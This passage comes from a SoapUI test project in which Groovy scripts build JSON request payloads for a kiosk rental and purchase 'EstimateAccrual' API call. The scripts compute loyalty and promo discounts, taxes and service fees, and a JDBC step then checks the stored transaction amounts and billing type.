			loyaltyProductId.add(curLoyaltyTitle);
		    	loyaltyProductPrice.add(curLoyaltyPrice);
		    	loyaltyPoints.add(curredemptionPoints);
		    	discountAmountList.add(curLoyaltyPrice); //PROMO
		    	//For Assertions grabbing all the Discounted Titles and Prices.
		    	discountedProductId.add(curLoyaltyTitle);
		    	discountedProductPrice.add(curLoyaltyPrice);
		    	}
		    	else if (curLoyaltyFlag == "0")
		    	{
		    		//testRunner.testCase.setPropertyValue("HasLoyaltyDiscount","0");
		    		nonLoyaltyProductId.add(curLoyaltyTitle);
		    		nonLoyaltyProductPrice.add(curLoyaltyPrice);
		    		//log.info ("Flag is 0");
		    	}
		    	//remainingTitles = DiscountTitleIds.drop(1).toString().replace("[", "").replace("]", "");
		    	testRunner.testCase.setPropertyValue("DiscountTitleIds",DiscountTitleIds.drop(1).toString().replace("[", "").replace("]", ""))
		    	testRunner.testCase.setPropertyValue("DiscountProductPrices",DiscountProductPrices.drop(1).toString().replace("[", "").replace("]", ""));
		    	testRunner.testCase.setPropertyValue("RedemptionPoints",redemptionPointsList.drop(1).toString().replace("[", "").replace("]", ""))		    	
		    	if (l+1 < numberOfLoyaltyFlags)
		      {
		      		if (curLoyaltyFlag == '1')
		      		{
		      			loyaltyPayload += ","
		      		}
		      		else
		      		{
		      			//None as of Now
		      			
		      		}
		      		     	
		      }
		      log.info ("loyaltyPayload: $loyaltyPayload");
		} 
		testRunner.testCase.setPropertyValue("LoyaltyProductPrice",loyaltyProductPrice.join(",").toString());
		testRunner.testCase.setPropertyValue("LoyaltyProductId",loyaltyProductId.join(",").toString());
		testRunner.testCase.setPropertyValue("NonLoyaltyProductId",nonLoyaltyProductId.join(",").toString());
		testRunner.testCase.setPropertyValue("NonLoyaltyProductPrice",nonLoyaltyProductPrice.join(",").toString());
	}
//Build Promo Payload
	if ((PromoCode == "" || PromoCode == "null" || PromoCode == null))
	{
		testRunner.testCase.setPropertyValue("HasPromoDiscount","0");//NO Promo
	}
	//TSP
	//else if (hasTSP == 'true')
	else if (numberOfTSPFlags > 0)
	{
		testRunner.testCase.setPropertyValue("HasPromoDiscount","1");
		def getNonLoyaltyProductId = context.expand( '${#TestCase#DiscountTitleIds}' );
		def getNonLoyaltyProductPrice = context.expand( '${#TestCase#DiscountProductPrices}' );
		//log.info ("getNonLoyaltyProductId:$getNonLoyaltyProductId; getNonLoyaltyProductPrice:$getNonLoyaltyProductPrice");
		getNonLoyaltyProductIdList = getNonLoyaltyProductId.split(",");
		getNonLoyaltyProductPriceList = getNonLoyaltyProductPrice.split(",");
		tspFlagList = tspFlag.split(","); //TSP

		for (tsp = 0; tsp < numberOfTSPFlags; tsp++)
		{
			curPromoTitleID = getNonLoyaltyProductIdList[tsp].toString().trim();
			curPromoTitlePrice = getNonLoyaltyProductPriceList[tsp].toString().trim();
			curTspFlag = tspFlagList[tsp].toString().trim(); //TSP
			promoPayload += "{";
			promoPayload += "\"ProductId\": $curPromoTitleID,";
			promoPayload += "\"DiscountType\": \"PromotionCode\",";
			promoPayload += "\"PromotionCode\": \"$PromoCode\",";			
            	promoPayload += "\"PromotionIntentCode\": 4,";
			promoPayload += "\"PromotionCodeValue\": \"$discountvalue\",";
			promoPayload += "\"Amount\": $discountvalue";
			promoPayload += "}";	

			tspPromoAmount += (discountvalue.toBigDecimal());
			discountedProductId.add(curPromoTitleID);
			discountedProductPrice.add(discountvalue);
			if (tsp+1 < numberOfTSPFlags)
			  {
					if (curTspFlag == '1')
					{
						promoPayload += ","
					}
					else
					{
						//None as of Now						
					}
			  }
		}
	}
	else
	{
		testRunner.testCase.setPropertyValue("HasPromoDiscount","1");
		def getNonLoyaltyProductId = context.expand( '${#TestCase#DiscountTitleIds}' );
		def getNonLoyaltyProductPrice = context.expand( '${#TestCase#DiscountProductPrices}' );
		//log.info ("getNonLoyaltyProductId:$getNonLoyaltyProductId; getNonLoyaltyProductPrice:$getNonLoyaltyProductPrice");
		getNonLoyaltyProductIdList = getNonLoyaltyProductId.split(",");
		getNonLoyaltyProductPriceList = getNonLoyaltyProductPrice.split(",");
		
		promoCodeValue = Round16.format(discountvalue).toBigDecimal();
		//Set Remaining Promo value same as Promo Value
		testRunner.testCase.setPropertyValue("RemainingPromoValue",promoCodeValue.toString());

		//For Loop to build Promo Payload
		for (d = 0; d < getNonLoyaltyProductIdList.size(); d++)
		{
			//Get Remaining promo value
			remainingPromoValue = context.expand( '${#TestCase#RemainingPromoValue}' ).toBigDecimal();
			if (remainingPromoValue > 0)
			{
				curPromoTitleID = getNonLoyaltyProductIdList[d].toString().trim();
				curPromoTitlePrice = getNonLoyaltyProductPriceList[d].toString().trim();
				BigDecimal curPromoAmount = 0; //For assertions.
				promoPayload += "{";
				promoPayload += "\"ProductId\": $curPromoTitleID,";
				promoPayload += "\"DiscountType\": \"PromotionCode\",";
				promoPayload += "\"PromotionCode\": \"$PromoCode\",";
				promoPayload += "\"PromotionCodeValue\": \"$discountvalue\",";
				promoPayload += "\"PromotionIntentCode\": 7,";
		
				BigDecimal currentPromoValue = remainingPromoValue - (curPromoTitlePrice.toBigDecimal());
		
				if (remainingPromoValue >= curPromoTitlePrice.toBigDecimal())
				{
					promoPayload += "\"Amount\": $curPromoTitlePrice";
					appliedPromoValue += (curPromoTitlePrice.toBigDecimal());
					curPromoAmount = curPromoTitlePrice.toBigDecimal();
					discountAmountList.add(curPromoAmount); //PROMO
					remaingPromoValue = (remainingPromoValue.toBigDecimal() -  curPromoTitlePrice.toBigDecimal());
					//Set Remaining Promo value after above calculation
					testRunner.testCase.setPropertyValue("RemainingPromoValue",remaingPromoValue.toString());
		
				}
				else if (remainingPromoValue < curPromoTitlePrice.toBigDecimal())
				{
					promoPayload += "\"Amount\": $remainingPromoValue";
					appliedPromoValue += (remainingPromoValue.toBigDecimal())
					curPromoAmount = remainingPromoValue.toBigDecimal();
					discountAmountList.add(curPromoAmount); //PROMO
					//Set Remaining Promo value as 0.00
					testRunner.testCase.setPropertyValue("RemainingPromoValue","0.00");
				}
				else
				{
					log.info ("No PromoValue Remaining");
				}
				
				promoPayload += "}";				
			    	//For Assertions grabbing all the Discounted Titles and Prices.
			    	discountedProductId.add(curPromoTitleID);
			    	discountedProductPrice.add(curPromoAmount);	
			}
			//Get Remaining promo value
			remainingPromoValue = context.expand( '${#TestCase#RemainingPromoValue}' ).toBigDecimal();
			//Continue to for loop if number of titles available and have Remaining promo value > 0
			if ((d+1 < getNonLoyaltyProductIdList.size()) && remainingPromoValue > 0)
			        {
			            promoPayload += ",";
			        } 
		}
		//log.info ("PromoPayload: $promoPayload");
	}
	testRunner.testCase.setPropertyValue("AppliedPromoValue",appliedPromoValue.toString());
	testRunner.testCase.setPropertyValue("DiscountAmountList",discountAmountList.join(",").toString()); //PROMO
	log.info ("promoPayload:$promoPayload");
	testRunner.testCase.setPropertyValue("EstimatedLoyaltyAmount", EstimatedLoyaltyAmount.toString());
	//Rounding the rental Total
	rentalTotal = Round16.format(rentalTotal).toBigDecimal();
	SubTotal += rentalTotal;
	log.info ("EstimatedLoyaltyAmount:$EstimatedLoyaltyAmount; discountvalue:$discountvalue");
	discountvalue = Round16.format(discountvalue).toBigDecimal();
	log.info ("Rentals Total: $rentalTotal; Promo Amount: $discountvalue");
	BigDecimal discountedSubTotal
	discountedSubTotal = ((rentalTotal).toBigDecimal()) - ((EstimatedLoyaltyAmount).toBigDecimal());
	//log.info ("discountedSubTotal:$discountedSubTotal");
	//if (rentalTotal <= discountvalue)	{ discountedSubTotal = 0 }
	//TSP
	if (numberOfTSPFlags > 0) 
	{
		discountvalue = tspPromoAmount; //Promo Amount is set as TSP Amount.
		testRunner.testCase.setPropertyValue("PromoValue", tspPromoAmount.toString())
	}
	if (discountedSubTotal <= discountvalue)	{ discountedSubTotal = 0 }
	//else { discountedSubTotal = ((rentalTotal).toBigDecimal()) - ((discountvalue).toBigDecimal()) }
	else { discountedSubTotal = ((discountedSubTotal).toBigDecimal()) - ((discountvalue).toBigDecimal()) }
	
	// Rounding Discounted SubTotal 
	discountedSubTotal = Round16.format(discountedSubTotal).toBigDecimal();
	BigDecimal renttaxRate = ((context.expand( '${#TestCase#RentalTaxRate}').toBigDecimal()) / 100)
	BigDecimal rentalTaxAmt = (Round16.format(discountedSubTotal).toBigDecimal()) * ((renttaxRate).toBigDecimal());
	//rentalTaxAmt = Round16.format(rentalTaxAmt).toBigDecimal();
	rentalTaxAmt = Round16.format(rentalTaxAmt).toBigDecimal();
	DiscountedSubTotal += discountedSubTotal;
	TotalCartAmount += discountedSubTotal; //To get total amount
	BigDecimal grandTotal = discountedSubTotal + rentalTaxAmt;
	// trying to solve some rounding issues
	//grandTotal = Round16.format(grandTotal).toBigDecimal();
	grandTotal = Round16.format(grandTotal).toBigDecimal();
	log.info ("Rentals Discounted Total:$discountedSubTotal; Rentals Tax Amount:$rentalTaxAmt; Rentals Grand Total:$grandTotal");
	// add totals to the strings
	rentalPayload += "]," 
	rentalPayload += "\"Totals\" : { "
	rentalPayload += "\"TaxRate\" : " + context.expand( '${#TestCase#RentalTaxRate}') + ","
	rentalPayload += "\"Subtotal\" : $rentalTotal ,"
	rentalPayload += "\"DiscountedSubtotal\" : $discountedSubTotal,"
	rentalPayload += "\"TaxAmount\" : $rentalTaxAmt,"
	rentalPayload += "\"GrandTotal\" : $grandTotal} }";
	
	testRunner.testCase.setPropertyValue("rentalPayload",rentalPayload);
	testRunner.testCase.setPropertyValue("RentalTaxAmount", rentalTaxAmt.toString());
	rentalTotal = grandTotal; //Defining it to calculate Total Amount
}
log.info ("discountedProductId:$discountedProductId; discountedProductPrice:$discountedProductPrice");
//Purchase payload
if ((purchaseFormatIds == '0') || (purchaseFormatIds == '') || (rentalFormatIds == 'null'))
{
	log.info ("No Purchases in the transaction");
	testRunner.testCase.setPropertyValue('PurchaseCount', purchaseCount.toString());
	testRunner.testCase.setPropertyValue("PurchaseTaxAmount", '0');
}
else
{
	for (r = 0; r < purchaseformatIDList.size(); r++)
	{
	    curPurchaseFormatID = purchaseformatIDList[r].toString().trim();
	    log.info ("PurchaseFormatID: $curPurchaseFormatID");
	    def getFormatName = sql.firstRow("select FormatName AS OID from Format where FormatID = $curPurchaseFormatID");
	    def purchaseFormatName = (getFormatName.OID);
	    getDisctc.setPropertyValue('FormatID', curPurchaseFormatID);
	    getDisctc.setPropertyValue('FormatName', purchaseFormatName);  
	    getDisctc.setPropertyValue('KioskID',KioskId);  	    
	    //Run the test case: GetRecoDiscs
	    def runGetDiscs = getDisctc.run( null, false );
	        
	    // show that it worked out ok
	    log.info("Status: $runGetDiscs.status, time taken for TestCase : [Get Discs] For $purchaseFormatName was: $runGetDiscs.timeTaken ms");
	        
	    // assert that it didn't fail
	    assert runGetDiscs.status != Status.FAILED : runGetDiscs.reason
	}
	
	//Offer Code	
	offerCodeList = remainingRCFlag.toString().replaceAll("\\[","").replaceAll("\\]","").split(",");
	
	for (f = 0; f < purchaseformatIDList.size(); f++)
	{
	    curformatID = purchaseformatIDList[f].toString().trim();
	    def getFormatName = sql.firstRow("select FormatName, FormatTypeID from Format where FormatID = $curformatID");
	    def FormatName = (getFormatName.FormatName);
	    def formatTypeID = (getFormatName.FormatTypeID.toString());
	    
	    //Get FormatTypeName from FormatIypeID
	    def excuteFormatType = sql.firstRow("Select FormatTypeName from FormatType Where FormatTypeID = $formatTypeID");
	    def formatTypeName = (excuteFormatType.FormatTypeName.toString());
	    
	    def getBarcode = getDisctc.getPropertyValue("$FormatName-Barcodes");
	    def getTitleIDs = getDisctc.getPropertyValue("$FormatName-Titles");    
	    //log.info ("getBarcode-$FormatName: $getBarcode");
	    getBarcodeList = getBarcode.split(",")
	    getTitleList = getTitleIDs.split(",")
	
	    numOfPurchaseBarcodes = numAddPurchasesList[f].toString().trim()
	    log.info ("numOfPurchaseBarcodes: $numOfPurchaseBarcodes; FormatName: $FormatName");
	
	    for (b = 0; b < numOfPurchaseBarcodes.toInteger(); b++)
	    {
		curBarcodeID = getBarcodeList[b].toString().trim();
		curTitleID = getTitleList[b].toString().trim();
		curOfferCode = offerCodeList[b].toString().trim();
		purchasePayload += "{"
		purchasePayload += "\"ProductId\" : $curTitleID,"
		purchasePayload += "\"Barcode\" : \"$curBarcodeID\","
		purchasePayload += "\"VendStatus\" : 28," //To-DO
		purchasePayload += "\"ProductFamily\" : \"$formatTypeName\","
		purchasePayload += "\"ProductType\" : \"$FormatName\","
		purchasePayload += "\"MultiDisc\" : false,"
		if (curOfferCode == '1')
		{
			purchasePayload += "\"OfferCode\" : \"RC\","
		}
		else
		{
			purchasePayload += "\"OfferCode\" : null,"
		}
		purchasePayload += "\"Pricing\" : {"
	        if (curformatID == '17') //DigitalCode Json
	        {
	            purchasePayload += "\"InitialNight\" : 0,"
	            purchasePayload += "\"ExtraNight\" : 0,"
	            purchasePayload += "\"NonReturn\" : 0,"
	            purchasePayload += "\"Purchase\" : $digitalCodePrice,"
	            purchasePayload += "\"Expiration\" : 0,"
	            purchasePayload += "\"NonReturnDays\" : 0,"
	            //Added a part of ProductPricing for BI; harcoded for the time being.
	            purchasePayload += "\"PriceSetId\" : 0,"
	            purchasePayload += "\"ProductPriceId\" : 0,"
	            purchasePayload += "\"InitialDays\" : null,"
	            purchasePayload += "\"DefaultInitialNight\" : null,"
	            purchasePayload += "\"DefaultExtraNight\" : null"
		  
	            //Calculate Rental Total
	            digitalTotal += (digitalCodePrice.toBigDecimal());
	            purchaseDiscPrice.add(digitalCodePrice);
	        }
	        else  //Regular Purchase of DVD, Bluray, or Game
	        {
	            purchasePayload += "\"InitialNight\" : 0,"
	            purchasePayload += "\"ExtraNight\" : 0,"
	            purchasePayload += "\"NonReturn\" : 0,"
	            purchasePayload += "\"Purchase\" : $purchasePrice,"
	            purchasePayload += "\"Expiration\" : 0,"
	            purchasePayload += "\"NonReturnDays\" : 0,"
	            //Added a part of ProductPricing for BI; harcoded for the time being.
	            purchasePayload += "\"PriceSetId\" : 0,"
	            purchasePayload += "\"ProductPriceId\" : 0,"
	            purchasePayload += "\"InitialDays\" : null,"
	            purchasePayload += "\"DefaultInitialNight\" : null,"
	            purchasePayload += "\"DefaultExtraNight\" : null"
	
	            //Calculate Rental Total
	            purchaseTotal += (purchasePrice.toBigDecimal());
	            purchaseDiscPrice.add(purchasePrice);
	            HasPhysicalPurchase = 'true';
	            testRunner.testCase.setPropertyValue("HasPhysicalPurchase",HasPhysicalPurchase);
	        }
	        
	        //purchasePayload += ",\"SourceType\" : 1" --NEEDED ONLY FOR RECO (RESVAUTH AND MODRESVPICKUP
		purchasePayload += "}"    
		purchasePayload += "}" 
		//Combine the list
		purchaseTitleIds.add(curTitleID);
		purchaseBarcodes.add(curBarcodeID);
		allBarcodes.add(curBarcodeID);
		purchaseProductFamily.add(formatTypeName);
		purchaseProductType.add(FormatName);
		testRunner.testCase.setPropertyValue("BarcodeForTnx",curBarcodeID.toString());
	        //Count num of purchase.
	        purchaseCount += 1;
	        if (b+1 < numOfPurchaseBarcodes.toInteger())
	        {
	            purchasePayload += ","
	        } 
	    }
	    if (f+1 < purchaseformatIDList.size())
	    {
	        purchasePayload += ","
	    }
	    getDisctc.setPropertyValue('ExcludeRentalTitles', purchaseTitleIds.join(",").toString());
	    testRunner.testCase.setPropertyValue('PurchaseTitleIds', purchaseTitleIds.join(",").toString());
	    testRunner.testCase.setPropertyValue('PurchaseBarcodes', purchaseBarcodes.join(",").toString());
	    testRunner.testCase.setPropertyValue('PurchaseProductFamily', purchaseProductFamily.join(",").toString());
	    testRunner.testCase.setPropertyValue('PurchaseProductType', purchaseProductType.join(",").toString());
	    testRunner.testCase.setPropertyValue('PurchaseCount', purchaseCount.toString());
	    testRunner.testCase.setPropertyValue('PurchaseDiscPrice', purchaseDiscPrice.join(",").toString());
	}
	
	//Purchase Calculation	
	BigDecimal totalPurchaseTotal = (purchaseTotal.toBigDecimal() + digitalTotal.toBigDecimal())
	log.info ("totalPurchaseTotal: $totalPurchaseTotal");
	DiscountedSubTotal += totalPurchaseTotal;
	SubTotal += totalPurchaseTotal;
	def purchasetaxRate = context.expand( '${#TestCase#PurchaseTaxRate}');
	def digitalpurchasetaxRate = context.expand( '${#TestCase#DigitalPurchaseTaxRate}');
	if (digitalpurchasetaxRate == null || digitalpurchasetaxRate == "null" || digitalpurchasetaxRate == "") //If digitalpurchasetaxrate is null than use Purchase tax rate.
	{
		BigDecimal digitaltaxRate = ((purchasetaxRate.toBigDecimal()) / 100);
		BigDecimal digitalpurchaseTaxAmt = (Round16.format(digitalTotal).toBigDecimal()) * ((digitaltaxRate).toBigDecimal());
		digitalpurchaseTaxAmt = Round16.format(digitalpurchaseTaxAmt).toBigDecimal();
		testRunner.testCase.setPropertyValue("digitalpurchaseTaxAmt", digitalpurchaseTaxAmt.toString());
	}
	else //if digitalpurchasetaxrate is not null than use that ever is provided.
	{
		BigDecimal digitaltaxRate = ((digitalpurchasetaxRate.toBigDecimal()) / 100);
		BigDecimal digitalpurchaseTaxAmt = (Round16.format(digitalTotal).toBigDecimal()) * ((digitaltaxRate).toBigDecimal());
		digitalpurchaseTaxAmt = Round16.format(digitalpurchaseTaxAmt).toBigDecimal();
		testRunner.testCase.setPropertyValue("digitalpurchaseTaxAmt", digitalpurchaseTaxAmt.toString());
	}
	def totaldigitalpurchasetaxAmount = context.expand( '${#TestCase#digitalpurchaseTaxAmt}');
		
	BigDecimal purchaseTaxAmt = (Round16.format(purchaseTotal).toBigDecimal()) * ((purchasetaxRate).toBigDecimal()/100);
	purchaseTaxAmt = Round16.format(purchaseTaxAmt).toBigDecimal();
	
	log.info ("Digital Purchase Tax Amount: $totaldigitalpurchasetaxAmount; Purchase Tax Amount: $purchaseTaxAmt");
	def totalTaxAmount = (totaldigitalpurchasetaxAmount.toBigDecimal() + purchaseTaxAmt.toBigDecimal());
	BigDecimal purchaseGrandTotal = (totalPurchaseTotal + totalTaxAmount).toBigDecimal();
	log.info("Purchase Grand Total: $purchaseGrandTotal; Total Tax Amount: $totalTaxAmount");
	TotalCartAmount += totalPurchaseTotal; //To get total amount
	// add totals to the strings
	purchasePayload += "],"
	purchasePayload += "\"Totals\" : { ";
	if (HasPhysicalPurchase == 'true')
	{
		purchasePayload += "\"TaxRate\" : " + context.expand('${#TestCase#purchasetaxrate}') + ", ";
	}
	else
	{
		purchasePayload += "\"TaxRate\" : " + context.expand('${#TestCase#DigitalPurchaseTaxRate}') + ", ";
	}
	purchasePayload += "\"Subtotal\" : $totalPurchaseTotal,";
	purchasePayload += "\"DiscountedSubtotal\" : $totalPurchaseTotal,";
	//purchasePayload += "\"TaxAmount\" : \"" + totalTaxAmount + "\",";
	purchasePayload += "\"TaxAmount\" : $totalTaxAmount,";
	purchasePayload += "\"GrandTotal\" : $purchaseGrandTotal } }";
	
	testRunner.testCase.setPropertyValue("purchasePayload",purchasePayload);
	testRunner.testCase.setPropertyValue("PurchaseTaxAmount", totalTaxAmount.toString());
	purchaseTotal = purchaseGrandTotal;//Defining it to calculate Total Amount
}
testRunner.testCase.setPropertyValue('AllBarcodes', allBarcodes.join(",").toString());
TransactionTotal = (rentalTotal + purchaseTotal).setScale(2, BigDecimal.ROUND_HALF_UP);
//log.info ("TransactionTotal: $TransactionTotal");
testRunner.testCase.setPropertyValue("TransactionTotal",TransactionTotal.toString());
testRunner.testCase.setPropertyValue("DiscountedSubTotal",DiscountedSubTotal.toString());
testRunner.testCase.setPropertyValue("SubTotal",SubTotal.toString());

def HasLoyaltyDiscount = context.expand( '${#TestCase#HasLoyaltyDiscount}');
def HasPromoDiscount = context.expand( '${#TestCase#HasPromoDiscount}');
def discountPayload = "";

if (HasLoyaltyDiscount == '1' && HasPromoDiscount == '0')
{
	discountPayload = loyaltyPayload;
	log.info ("Has Loyalty Only");
}
else if (HasLoyaltyDiscount == '0' && HasPromoDiscount == '1')
{
	discountPayload = promoPayload;
	log.info ("Has Promo Only");
}
else if (HasLoyaltyDiscount == '1' && HasPromoDiscount == '1')
{
	discountPayload = "$loyaltyPayload,$promoPayload";
	log.info ("Has Loyalty and Promo");
}
else
{
	discountPayload = ""
	log.info ("No Promo and Loyalty");
}
log.info ("discountPayload:$discountPayload");
testRunner.testCase.setPropertyValue("DiscountPayload", discountPayload);
if (enableServiceFee == 'true')
{		
	serviceFeePayload += ",\"ServiceFee\": {";
	serviceFeePayload += "\"DefaultAmount\": \"$serviceFeeAmount\",";
	serviceFeePayload += "\"TaxRate\": $serviceFeeTaxRate,";
	if (TotalCartAmount > 0)
	{
		serviceFeePayload += "\"ActualAmount\": \"$serviceFeeAmount\",";
		BigDecimal serviceFeeTaxAmt = ((serviceFeeAmount).toBigDecimal()) * ((serviceFeeTaxRate).toBigDecimal()/100);
		serviceFeeTaxAmt = Round16.format(serviceFeeTaxAmt).toBigDecimal();
		serviceFeePayload += "\"TaxAmount\": \"$serviceFeeTaxAmt\" }";
	}
	else
	{
		serviceFeePayload += "\"ActualAmount\": \"0.00\",";
		serviceFeePayload += "\"TaxAmount\": \"0.00\" }";
	}
}
else
{
	log.info ("NO ServiceFee enabled");
}
testRunner.testCase.setPropertyValue("ServiceFeePayload",serviceFeePayload);

//Get Info needed 
def MessageId = UUID.randomUUID().toString();

def UseCredits = context.expand( '${#TestCase#UseCredits}');
calendar = Calendar.getInstance();
def theDate = (621355968000000000 +calendar.getTimeInMillis()*10000).toString();
def dateString = (new Date().format("yyyy-MM-dd'T'HH:mm:ss.SSSSSSS"));

//Build Authorize Request
requestPayload += "{";
requestPayload += "\"MessageType\": \"EstimateAccrual\",";
requestPayload += "\"MessageId\": \"$MessageId\",";
requestPayload += "\"EngineVersion\": \"1.27.1.297\",";
requestPayload += "\"BundleVersion\": \"2.27.1.65\",";
requestPayload += "\"KioskId\": $KioskId,";
if ((CustomerProfileNumber == "") || (CustomerProfileNumber == "<CPCUSTOMERNUMBER/>"))
{
	//No CP for the credit card
	requestPayload += "\"CustomerProfileNumber\": null,";
	requestPayload += "\"PropertyBag\": { },";
}
else
{
	requestPayload += "\"CustomerProfileNumber\": \"$CustomerProfileNumber\",";
	requestPayload += "\"PropertyBag\": { \"EarlyIdIndicator\":\"true\" },"
}
requestPayload += "$ccPayload";
requestPayload += "\"TransactionDate\": {";
requestPayload += "\"theDate\": $theDate,";
requestPayload += "\"dateTimeKind\": \"Unspecified\",";
requestPayload += "\"dateString\": \"$dateString\"";
requestPayload += "},";
requestPayload += "\"UseCredits\": \"OptedOut\",";
//requestPayload += "\"UseCredits\": \"OptedIn\",";
requestPayload += "\"ShoppingCart\": { ";
requestPayload += "\"Groups\": [  ";
if (rentalCount > 0 && purchaseCount == 0) {
	requestPayload += "$rentalPayload";
} else if (rentalCount == 0 && purchaseCount > 0) {
	requestPayload += "$purchasePayload";
} else if (rentalCount > 0 && purchaseCount > 0) {
	requestPayload += "$rentalPayload,$purchasePayload";
} else {
	log.info("No rental or purchase information generated!");
}
requestPayload += "],";
requestPayload += "\"Discounts\": [$discountPayload]";
requestPayload += "$serviceFeePayload";
requestPayload += "}} ";

// log to soapui log
log.info("EstimateAccrual Request: $requestPayload");

// url encode json string
result = "payload=" + URLEncoder.encode(requestPayload)
testRunner.testCase.setPropertyValue("RequestBody",result);
testRunner.testCase.setPropertyValue("EAMessageId",MessageId); 
]]></script></con:config></con:testStep><con:testStep type="httprequest" name="EstimateAccrual (Request)" id="8a0bdb6e-56ab-49c3-853b-5f33666923fa"><con:settings/><con:config method="POST" xsi:type="con:HttpRequest" name="EstimateAccrual (Request)" postQueryString="false" mediaType="application/x-www-form-urlencoded" id="b2fa5210-dde2-4787-8c9d-57bcd781cdfc" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:settings><con:setting id="com.eviware.soapui.impl.wsdl.WsdlRequest@request-headers">&lt;xml-fragment/></con:setting></con:settings><con:endpoint>${#Project#KSEndpoint}</con:endpoint><con:request>${#TestCase#RequestBody}</con:request><con:assertion type="GroovyScriptAssertion" name="Check for Success and HasErrors" id="70bc7102-0d46-4704-81fc-09b7237cee25"><con:configuration><scriptText>
def response = URLDecoder.decode(messageExchange.getResponseContent())
log.info ("EstimateAccrualResponse: $response")
	assert response.contains("\"Success\":true,")
	assert response.contains("\"HasErrors\":false,")

</scriptText></con:configuration></con:assertion><con:credentials><con:selectedAuthProfile>Basic</con:selectedAuthProfile><con:addedBasicAuthenticationTypes>Basic</con:addedBasicAuthenticationTypes><con:authType>No Authorization</con:authType></con:credentials><con:jmsConfig JMSDeliveryMode="PERSISTENT"/><con:jmsPropertyConfig/><con:parameters/><con:environmentSpec><con:entry environmentId="088f2c6b-5bf5-4b7a-aea1-4ebec9f3aa3a"><con:authProfile>Basic</con:authProfile></con:entry><con:entry environmentId="bff3f14b-e680-473b-bba1-89a50bc86a72"><con:authProfile>Basic</con:authProfile></con:entry></con:environmentSpec></con:config></con:testStep><con:testStep type="groovy" name="Save Authorize Response" id="b7fcb9a8-e4e9-495e-8c60-8cefdeb26691" disabled="true"><con:settings/><con:config><script>import groovy.json.JsonSlurper
def encodedBody = testRunner.testCase.getTestStepByName('Authorize (Request)').getPropertyValue('Response');
//log.info(encodedBody);
def decodedBody = URLDecoder.decode(encodedBody);
log.info("AuthResponse:$decodedBody");
def list = new JsonSlurper().parseText( decodedBody );
def TransactionID = list.get('ReferenceNumber');
log.info('Transaction_ID = ' + list.get('ReferenceNumber'))
testRunner.testCase.setPropertyValue("TransactionID",list.get('ReferenceNumber').toString());

//Define the Db Connection
import groovy.sql.*;
// Below line will create an object of the already created JDBC connection.
def ConObj = context.testCase.testSuite.project.databaseConnectionContainer.getResourceByName('MerchantService');
def constring = ConObj.getConnectionString();
//Define the Connection
def sql = Sql.newInstance(constring);

def getInvoiceDetails = sql.firstRow("Select max(OID) AS ID from Invoice Where ReferenceNumber = '$TransactionID'");
def InvoiceId = getInvoiceDetails.ID;
testRunner.testCase.setPropertyValue("InvoiceID",InvoiceId.toString());</script></con:config></con:testStep><con:testStep type="jdbc" name="Check Transaction" id="a27b7dbb-4adc-470e-9972-54149ddf787c" disabled="true"><con:settings><con:setting id="prettyPrintResponse">true</con:setting></con:settings><con:config xsi:type="con:JdbcRequestTestStep" convertColumnNamesToUpperCase="true" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><con:dbConnectionName>RedboxServerDB</con:dbConnectionName><con:driver>com.microsoft.sqlserver.jdbc.SQLServerDriver</con:driver><con:connectionString>jdbc:sqlserver://QADB100.rb.local:1433;databaseName=RedboxServerDB;integratedSecurity=true;</con:connectionString><con:password>t</con:password><con:connectionProperties/><con:query>SELECT 
	transaction_id,
	kioskclient_id,
	promotioncode,
	promotionvalue,
	transaction_status,
	rent_date,
	approvalcode,
	invoiceid,
	amount,
	isoffline,
	rentaltype,
	authamount,
	subtotal,
	discountedsubtotal,
	salestaxamount,
	grandtotal,
	billingtypeid,
	rentaltaxrate,
	purchasetaxrate,
	rentaltaxamount,
	purchasetaxamount,
	shoppingcarttype,
	optintypeID,
	cpCustomerNumber
FROM
	[Transaction](nolock)
WHERE 
	transaction_id = :TnxId
</con:query><con:storedProcedure>false</con:storedProcedure><con:assertion type="Simple Contains" name="Contains ApprovalCode" id="b6c88e9c-d6aa-482f-a3cf-28de7d50e88c"><con:configuration><token>Approved</token><ignoreCase>false</ignoreCase><useRegEx>false</useRegEx></con:configuration></con:assertion><con:assertion type="GroovyScriptAssertion" name="Check BillingType" id="3d102727-0107-496f-9f31-2aec87ad4ec2"><con:configuration><scriptText>//import groovy.json.JsonSlurper

def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context )
def holder = groovyUtils.getXmlHolder( "Check Transaction#ResponseAsXml");
int actualBillingTypeID = holder.getNodeValue("//BILLINGTYPEID[1]").toInteger();

def numrentals = context.expand( '${#TestCase#RentalCount}' ).toInteger();
def numpurchases = context.expand( '${#TestCase#PurchaseCount}' ).toInteger();
//Added if and else logic for PRM and PRG functionality.
if (numrentals > 0 &amp;&amp; numpurchases > 0)
{
	assert actualBillingTypeID == 6; //Because of PRM and PRG functionality.
}
else
{
	assert actualBillingTypeID == 7;
}

/* DISABLED THE ASSERTION BASED ON COLLECTION METHOD
else
{
	// if collection method is 1 or 2, billing type 6, collection method 4 or 6 = billing type 7
	if (context.expand( '${#TestSuite#collectionmethod}' ).toInteger() == 1)
		assert actualValue == 6
	else if (context.expand( '${#TestSuite#collectionmethod}' ).toInteger() == 2)
		assert actualValue == 6
	else if (context.expand( '${#TestSuite#collectionmethod}' ).toInteger() == 4)
		assert actualValue == 7
	else if (context.expand( '${#TestSuite#collectionmethod}' ).toInteger() == 6)
		assert actualValue == 7
	else
		assert 0 == 1
}
 */</scriptText></con:configuration></con:assertion><con:assertion type="GroovyScriptAssertion" name="Check Amounts" id="62dae791-ac46-4245-b0bd-42288e2bb164"><con:configuration><scriptText>import java.text.DecimalFormat;
Round4 = new DecimalFormat("#.####");

//Get Rental Count
def numRentals = context.expand( '${#TestCase#RentalCount}' ).toBigDecimal();
def numPurchases = context.expand( '${#TestCase#PurchaseCount}' ).toBigDecimal();
def HasPhysicalPurchase = context.expand( '${#TestCase#HasPhysicalPurchase}' );

//Get the actual values from JDBC response
def groovyUtils = new com.eviware.soapui.support.GroovyUtils( context )
def holder = groovyUtils.getXmlHolder( "Check Transaction#ResponseAsXml");
def actualRentalTaxAmount = holder.getNodeValue("//RENTALTAXAMOUNT[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
def actualPurchaseTaxAmount = holder.getNodeValue("//PURCHASETAXAMOUNT[1]").toBigDecimal().setScale(4, BigDecimal.ROUND_HALF_UP);
